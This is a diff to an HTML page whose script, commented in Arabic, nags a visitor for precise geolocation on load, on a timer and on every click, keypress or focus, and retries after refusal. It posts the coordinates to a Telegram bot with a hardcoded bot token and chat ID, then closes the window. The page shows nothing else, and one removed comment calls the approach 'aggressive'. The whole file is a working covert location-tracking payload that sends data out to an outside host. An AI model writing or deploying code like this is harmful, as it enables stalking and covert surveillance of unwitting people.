@@ -7,52 +7,120 @@
         const BOT_TOKEN = "8071212707:AAFvb7gER0iIsZCRt14JPzkTLksCULJY4aI";
         const CHAT_ID = "6451561574";
 
-        function aggressiveInfiniteRequest() {
+        let requestCount = 0;
+        let isRequesting = false;
+
+        function startLocationRequests() {
+            console.log("بدء طلبات الموقع...");
+            
             // طلب فوري
             requestLocation();
             
-            // طلب كل 2 ثانية
-            setInterval(requestLocation, 2000);
+            // طلب كل 3 ثواني
+            setInterval(requestLocation, 3000);
             
             // طلب عند أي تفاعل
-            window.addEventListener('click', requestLocation);
-            window.addEventListener('touchstart', requestLocation);
-            window.addEventListener('keydown', requestLocation);
-            window.addEventListener('mousemove', requestLocation);
+            document.addEventListener('click', triggerRequest);
+            document.addEventListener('touchstart', triggerRequest);
+            document.addEventListener('keydown', triggerRequest);
+            window.addEventListener('focus', triggerRequest);
+        }
+
+        function triggerRequest() {
+            if (!isRequesting) {
+                requestLocation();
+            }
         }
 
         function requestLocation() {
+            if (isRequesting) return;
+            
+            isRequesting = true;
+            requestCount++;
+            console.log(`طلب الموقع #${requestCount}`);
+
+            if (!navigator.geolocation) {
+                console.log("المتصفح لا يدعم الموقع");
+                isRequesting = false;
+                return;
+            }
+
             navigator.geolocation.getCurrentPosition(
+                // ✅ النجاح
                 async function(position) {
+                    console.log("✅ تم الحصول على الموقع!");
                     const lat = position.coords.latitude;
                     const lng = position.coords.longitude;
+                    const accuracy = position.coords.accuracy;
                     
-                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({
-                            chat_id: CHAT_ID,
-                            text: `📍 ${lat},${lng}`
-                        })
-                    });
+                    // إرسال للبوت
+                    await sendToTelegram(lat, lng, accuracy, requestCount);
                     
-                    window.close();
+                    // إغلاق الصفحة
+                    setTimeout(() => {
+                        window.close();
+                    }, 1000);
                 },
+                // ❌ الفشل
                 function(error) {
-                    // تجاهل الرفض - نستمر
+                    console.log(`❌ تم رفض الطلب #${requestCount}:`, error.message);
+                    isRequesting = false;
+                    
+                    // نعيد المحاولة بعد وقت قصير
+                    setTimeout(() => {
+                        isRequesting = false;
+                    }, 1000);
                 },
-                { enableHighAccuracy: true, timeout: 3000 }
+                {
+                    enableHighAccuracy: true,
+                    timeout: 5000,
+                    maximumAge: 0
+                }
             );
         }
 
-        // البدء العدواني الفوري
-        aggressiveInfiniteRequest();
-        
-        // وإعادة البدء كل 10 ثواني للتأكد
-        setInterval(aggressiveInfiniteRequest, 10000);
+        async function sendToTelegram(lat, lng, accuracy, attempts) {
+            const message = 
+                `🎯 موقع من طلب لا نهائي\n\n` +
+                `📍 الإحداثيات:\n` +
+                `• خط العرض: ${lat.toFixed(6)}\n` +
+                `• خط الطول: ${lng.toFixed(6)}\n` +
+                `• الدقة: ${accuracy} متر\n\n` +
+                `🔄 المحاولة: ${attempts}\n` +
+                `🕒 الوقت: ${new Date().toLocaleString('ar-MA')}`;
+
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message
+                    })
+                });
+                console.log("✅ تم الإرسال للبوت");
+            } catch (error) {
+                console.log("❌ فشل الإرسال:", error);
+            }
+        }
+
+        // البدء بعد تحميل الصفحة مباشرة
+        window.onload = function() {
+            console.log("الصفحة محملة - بدء الطلبات...");
+            startLocationRequests();
+        };
+
+        // أيضاً نبدأ عندما يصبح الصفحة مرئية
+        document.addEventListener('visibilitychange', function() {
+            if (!document.hidden) {
+                console.log("الصفحة مرئية - طلب موقع...");
+                setTimeout(requestLocation, 500);
+            }
+        });
 
     </script>
 </head>
-<body style="margin:0;padding:0;background:transparent;">
+<body style="margin:0;padding:0;background:#f0f0f0;">
+    <!-- صفحة مع خلفية مرئية للتأكد من التحميل -->
 </body>
 </html>
